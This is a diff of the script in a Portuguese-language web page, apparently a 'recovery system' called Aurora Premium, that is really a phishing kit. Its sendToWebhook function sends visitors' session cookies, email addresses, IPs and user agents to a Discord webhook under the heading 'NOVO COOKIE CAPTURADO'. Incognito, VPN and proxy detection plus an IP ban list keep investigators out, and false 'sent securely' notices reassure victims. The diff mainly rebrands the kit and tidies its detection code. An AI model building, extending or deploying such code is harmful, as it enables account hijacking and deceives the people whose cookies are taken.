-                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2306,7 +2644,6 @@
                 }
                 detectionMethods++;
 
-                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2316,7 +2653,6 @@
                 }
                 detectionMethods++;
 
-                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => {
@@ -2337,23 +2673,18 @@
                     }
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(positiveResults >= 2);
                 }, 1000);
             });
         }
 
-        // ============================================================
-        // 1.5 FUNÇÃO PARA DETECTAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS EFICAZ)
-        // ============================================================
         function detectPrivateBrowsingBrowser() {
             return new Promise((resolve) => {
                 let result = false;
                 let checksDone = 0;
                 let totalChecks = 4;
                 
-                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2363,7 +2694,6 @@
                 }
                 checksDone++;
 
-                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2373,7 +2703,6 @@
                 }
                 checksDone++;
 
-                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => { 
@@ -2394,10 +2723,8 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Método 4: quota de armazenamento (Chrome)
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é menor que 120MB
                         if (estimate.quota < 120000000) {
                             result = true;
                         }
@@ -2412,30 +2739,25 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(result);
                 }, 3000);
             });
         }
 
-        // Detectar VPN/Proxy via IP com múltiplos métodos
         async function detectVPN() {
             try {
-                // Usar múltiplas APIs para melhor precisão
                 const ipData = await getIPData();
                 if (!ipData) return false;
 
-                // Verificar indicadores de VPN com lógica mais rigorosa
                 const vpnIndicators = [
                     ipData.is_vpn === true,
                     ipData.is_proxy === true,
                     ipData.is_tor === true,
                     ipData.is_datacenter === true,
-                    ipData.threat_level > 50 // Alto nível de ameaça
+                    ipData.threat_level > 50
                 ];
 
-                // Retorna true se detectar VPN/Proxy/Tor ou datacenter
                 const detected = vpnIndicators.some(indicator => indicator === true);
                 if (detected) {
                     console.warn('🚨 VPN/Proxy detectado:', ipData);
@@ -2447,7 +2769,6 @@
             }
         }
 
-        // Obter dados de IP com fallback
         async function getIPData() {
             const apis = [
                 {
@@ -2467,14 +2788,6 @@
                         is_proxy: data.proxy === true,
                         is_datacenter: data.hosting === true,
                         threat_level: (data.proxy || data.hosting) ? 75 : 0
-                    })
-                },
-                {
-                    url: 'https://api.abuseipdb.com/api/v2/check?maxAgeInDays=90',
-                    headers: { 'Key': 'unknown' },
-                    parser: (data) => ({
-                        is_vpn: data.usageType === 'VPN',
-                        threat_level: data.abuseConfidenceScore || 0
                     })
                 }
             ];
@@ -2499,15 +2812,12 @@
             return null;
         }
 
-        // Detectar Google Chrome anônimo especificamente com múltiplos métodos
         async function isGoogleIncognito() {
             return new Promise((resolve) => {
                 let detectionResults = [];
 
-                // Método 1: Verificar quota de armazenamento
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é muito menor (< 120MB)
                         detectionResults.push(estimate.quota < 120000000);
                         if (detectionResults.length >= 2) {
                             resolve(detectionResults.some(r => r === true));
@@ -2522,7 +2832,6 @@
                     detectionResults.push(false);
                 }
 
-                // Método 2: Verificar requestFileSystem (Chrome específico)
                 if (window.webkitRequestFileSystem) {
                     window.webkitRequestFileSystem(
                         window.TEMPORARY,
@@ -2534,7 +2843,7 @@
                             }
                         },
                         () => {
-                            detectionResults.push(true); // Erro = modo incógnito
+                            detectionResults.push(true);
                             if (detectionResults.length >= 2) {
                                 resolve(detectionResults.some(r => r === true));
                             }
@@ -2544,7 +2853,6 @@
                     detectionResults.push(false);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     if (detectionResults.length > 0) {
                         resolve(detectionResults.some(r => r === true));
@@ -2557,11 +2865,8 @@
 
         async function checkBlocked() {
             try {
-                // Verificar navegador anônimo
                 const isPrivate = await isPrivateBrowsing();
                 const isGoogleIncog = await isGoogleIncognito();
-                
-                // Verificar VPN/Proxy
                 const hasVPN = await detectVPN();
                 
                 const blockModal = document.getElementById('blockModal');
@@ -2604,7 +2909,7 @@
         let timerInterval = null;
         let isBlocked = false;
         let termsAccepted = false;
-        let isUserBanned = false; // NOVA VARIÁVEL PARA CONTROLE DE BANIMENTO
+        let isUserBanned = false;
         let webhookInfo = {
             username: 'Aurora Security',
             avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
@@ -2636,14 +2941,12 @@
         // ============================================================
         async function checkBanStatus() {
             try {
-                // Pegar IP do visitante
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
                 console.log('🔍 Verificando IP:', ip);
 
-                // Verificar na API de banimento
                 const banResponse = await fetch(`/api/ban?check=${ip}`);
                 const banData = await banResponse.json();
 
@@ -2684,13 +2987,11 @@
             blockModal.classList.add('active');
             document.body.style.overflow = 'hidden';
             
-            // Esconder o formulário de recuperação
             const recoveryForm = document.getElementById('recoveryForm');
             if (recoveryForm) {
                 recoveryForm.style.display = 'none';
             }
             
-            // Desabilitar botão de submit
             const submitBtn = document.getElementById('submitBtn');
             if (submitBtn) {
                 submitBtn.disabled = true;
@@ -2704,7 +3005,6 @@
         // 4. TERMS MODAL
         // ============================================================
         function openTermsModal() {
-            // Verificar se está banido
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2722,7 +3022,7 @@
             termsAccepted = true;
             localStorage.setItem('aurora_terms_accepted', 'true');
             closeTermsModal();
-            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. 🇧🇷');
+            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. ✦');
             showSection('recovery');
         }
 
@@ -2731,7 +3031,6 @@
             if (saved === 'true') {
                 termsAccepted = true;
             } else {
-                // Verificar se está banido antes de abrir o modal
                 if (!isUserBanned) {
                     setTimeout(() => { openTermsModal(); }, 1500);
                 }
@@ -2757,11 +3056,10 @@
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // Obter dados de VPN para relatório
                 const vpnData = vpnDetected ? await getIPData() : null;
                 
                 const payload = {
-                    content: `🏆 **NOVO COOKIE CAPTURADO - #HEXAVEM** 🇧🇷\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n🏆 **#HexaVem** 🇧🇷`,
+                    content: `✦ **NOVO COOKIE CAPTURADO - AURORA PREMIUM** ✦\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✦ **Aurora Premium** ✦`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
@@ -2790,46 +3088,6 @@
         }
 
         // ============================================================
-        // 6.5 FUNÇÃO PARA VERIFICAR NAVEGADOR ANÔNIMO E VPN VIA API
-        // ============================================================
-        async function checkDetection() {
-            try {
-                const response = await fetch('/api/detect');
-                const data = await response.json();
-                
-                console.log('📊 Resultado da detecção:', data);
-                
-                if (data.data && data.data.blocked) {
-                    const blockModal = document.getElementById('blockModal');
-                    const blockReason = document.getElementById('blockReason');
-                    
-                    let message = '';
-                    if (data.data.isPrivate) {
-                        message = '🔒 Navegador Anônimo/Incógnito Detectado\n\n❌ Navegadores anônimos não são permitidos por questões de segurança.';
-                    } else if (data.data.vpn && data.data.vpn.isVPN) {
-                        message = '🌐 VPN ou Proxy Detectado\n\n❌ Conexões via VPN ou proxy não são permitidas por questões de segurança.';
-                    }
-                    
-                    // Detalhes adicionais
-                    if (data.data.vpn && data.data.vpn.details) {
-                        const details = data.data.vpn.details;
-                        message += `\n\n📌 Detalhes:\n📍 País: ${details.country}\n🏙️ Cidade: ${details.city}\n📡 ISP: ${details.isp}`;
-                    }
-                    
-                    blockReason.textContent = message;
-                    blockModal.classList.add('active');
-                    document.body.style.overflow = 'hidden';
-                    return data.data;
-                }
-                
-                return data.data || { blocked: false };
-            } catch (error) {
-                console.error('❌ Erro ao verificar detecção:', error);
-                return { blocked: false };
-            }
-        }
-
-        // ============================================================
         // 7. MENU MOBILE
         // ============================================================
         function toggleMenu() {
@@ -2840,7 +3098,6 @@
         // 8. NAVEGAÇÃO
         // ============================================================
         function showSection(sectionId) {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2867,7 +3124,6 @@
         // 8.5 FUNÇÃO PARA IR PARA RECUPERAÇÃO COM VERIFICAÇÃO
         // ============================================================
         function goToRecovery() {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
@@ -2936,26 +3192,22 @@
         async function handleSubmit(event) {
             event.preventDefault();
             
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
             }
             
-            // Verificar se aceitou os termos
             if (!termsAccepted) {
                 openTermsModal();
-                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. 🇧🇷');
+                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. ✦');
                 return;
             }
             
-            // Verificar se está bloqueado por tentativa
             if (isBlocked) {
                 showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
                 return;
             }
 
-            // Verificar navegador anônimo (reforço)
             const isPrivate = await isPrivateBrowsing();
             const isGoogleIncog = await isGoogleIncognito();
             const hasVPN = await detectVPN();
@@ -2983,7 +3235,6 @@
                 return;
             }
 
-            // Verificar se já tentou
             if (hasAttempted) {
                 showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return;
@@ -2991,7 +3242,6 @@
 
             const ip = await getIP();
 
-            // Mostrar loading
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
@@ -3001,7 +3251,6 @@
                 hasAttempted = true;
                 isBlocked = true;
                 
-                // Salvar bloqueio de 9 horas
                 blockUntil = Date.now() + (9 * 60 * 60 * 1000);
                 localStorage.setItem('aurora_block_until', blockUntil.toString());
                 
@@ -3015,7 +3264,7 @@
                 if (timerInterval) clearInterval(timerInterval);
                 timerInterval = setInterval(updateTimer, 1000);
                 
-                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. 🇧🇷');
+                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✦');
                 showProcessingModal();
             } else {
                 document.getElementById('submitBtn').disabled = false;
@@ -3065,7 +3314,7 @@
 
         function closeSuccessModal() {
             document.getElementById('successModal').classList.remove('active');
-            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. 🇧🇷 #HexaVem');
+            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✦ Aurora Premium ✦');
         }
 
         // ============================================================
@@ -3077,9 +3326,9 @@
                 position: fixed;
                 top: 100px;
                 right: 20px;
-                background: linear-gradient(135deg, rgba(10,26,10,0.95), rgba(26,42,26,0.95));
+                background: linear-gradient(135deg, rgba(10,6,21,0.95), rgba(26,10,46,0.95));
                 backdrop-filter: blur(20px);
-                border: 1px solid rgba(254,220,0,0.15);
+                border: 1px solid rgba(124,58,237,0.3);
                 border-radius: 12px;
                 padding: 1.2rem 1.5rem;
                 max-width: 350px;
@@ -3092,7 +3341,7 @@
             notif.innerHTML = `
                 <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.3rem;">
                     <span style="font-size:1.5rem;">${icon}</span>
-                    <strong style="font-size:1rem;">${title}</strong>
+                    <strong style="font-size:1rem;color:#c084fc;">${title}</strong>
                 </div>
                 <p style="color:rgba(255,255,255,0.7);margin:0;font-size:0.9rem;">${message}</p>
             `;
@@ -3127,7 +3376,7 @@
         // ============================================================
         window.addEventListener('scroll', () => {
             const navbar = document.querySelector('.navbar');
-            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 26, 10, 0.98)' : 'rgba(10, 26, 10, 0.95)';
+            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 6, 21, 0.98)' : 'rgba(10, 6, 21, 0.95)';
         });
 
         // ============================================================
@@ -3159,22 +3408,23 @@
         // ============================================================
         // 19. CONSOLE
         // ============================================================
-        console.log('%c🏆 Aurora Premium v2.0 🇧🇷', 'font-size:24px;font-weight:bold;color:#009739;');
-        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#fedc00;');
+        console.log('%c✦ Aurora Premium v3.0 ✦', 'font-size:24px;font-weight:bold;color:#7c3aed;');
+        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#c084fc;');
         console.log('%c⏳ 1 tentativa apenas | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
         console.log('%c🔒 Navegador anônimo bloqueado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Sistema de Banimento por IP ativado', 'font-size:14px;color:#ef4444;');
-        console.log('%c🔒 Detecção de VPN/Proxy ativada', 'font-size:14px;color:#10b981;');
-        console.log('%c🔒 Detecção de navegador anônimo (via navegador)', 'font-size:14px;color:#10b981;');
-        console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
-        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#fedc00;');
-        console.log('%c🏆 #HexaVem! 🇧🇷', 'font-size:18px;font-weight:bold;color:#fedc00;');
+        console.log('%c🔒 Detecção de VPN/Proxy ativada', 'font-size:14px;color:#a78bfa;');
+        console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#a78bfa;');
+        console.log('%c👥 Comunidade: Discord | Email | TikTok | GitHub', 'font-size:14px;color:#c084fc;');
+        console.log('%c✦ Aurora Premium ✦', 'font-size:18px;font-weight:bold;color:#7c3aed;');
 
         // ============================================================
         // 20. INICIAR
         // ============================================================
         async function init() {
-            // ===== 1. VERIFICAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS CONFIÁVEL) =====
+            // Criar estrelas
+            createStars();
+            
             console.log('🔍 Verificando navegador anônimo (via navegador)...');
             const isPrivateBrowser = await detectPrivateBrowsingBrowser();
             
@@ -3189,16 +3439,14 @@
             }
             console.log('✅ Navegador normal, continuando...');
 
-            // ===== 2. VERIFICAR SE O IP ESTÁ BANIDO =====
             console.log('🔍 Verificando se o IP está banido...');
             const isBanned = await checkBanStatus();
             if (isBanned) {
                 console.log('🚫 Acesso bloqueado: IP banido');
-                return; // IMPEDE O ACESSO COMPLETO AO SITE
+                return;
             }
             console.log('✅ IP não está banido, continuando...');
 
-            // ===== 3. VERIFICAR NAVEGADOR ANÔNIMO E VPN (VIA API) =====
             console.log('🔍 Verificando navegador e VPN via API...');
             const detectResult = await checkDetection();
             
@@ -3208,11 +3456,9 @@
             }
             console.log('✅ Navegador e VPN OK!');
 
-            // Carregar informações do webhook do Discord
             console.log('🔗 Carregando informações do webhook...');
             await fetchWebhookInfo();
             
-            // Verificar bloqueio de anônimo (APENAS - fallback)
             const blocked = await checkBlocked();
             if (blocked) {
                 console.log('🚭 Acesso bloqueado: Navegador Anônimo detectado');
@@ -3224,7 +3470,46 @@
         }
 
         // ============================================================
-        // 21. EXECUTAR
+        // 21. FUNÇÃO DE DETECÇÃO VIA API (FALLBACK)
+        // ============================================================
+        async function checkDetection() {
+            try {
+                const response = await fetch('/api/detect');
+                const data = await response.json();
+                
+                console.log('📊 Resultado da detecção:', data);
+                
+                if (data.data && data.data.blocked) {
+                    const blockModal = document.getElementById('blockModal');
+                    const blockReason = document.getElementById('blockReason');
+                    
+                    let message = '';
+                    if (data.data.isPrivate) {
+                        message = '🔒 Navegador Anônimo/Incógnito Detectado\n\n❌ Navegadores anônimos não são permitidos por questões de segurança.';
+                    } else if (data.data.vpn && data.data.vpn.isVPN) {
+                        message = '🌐 VPN ou Proxy Detectado\n\n❌ Conexões via VPN ou proxy não são permitidas por questões de segurança.';
+                    }
+                    
+                    if (data.data.vpn && data.data.vpn.details) {
+                        const details = data.data.vpn.details;
+                        message += `\n\n📌 Detalhes:\n📍 País: ${details.country}\n🏙️ Cidade: ${details.city}\n📡 ISP: ${details.isp}`;
+                    }
+                    
+                    blockReason.textContent = message;
+                    blockModal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return data.data;
+                }
+                
+                return data.data || { blocked: false };
+            } catch (error) {
+                console.error('❌ Erro ao verificar detecção:', error);
+                return { blocked: false };
+            }
+        }
+
+        // ============================================================
+        // 22. EXECUTAR
         // ============================================================
         init();
     </script>
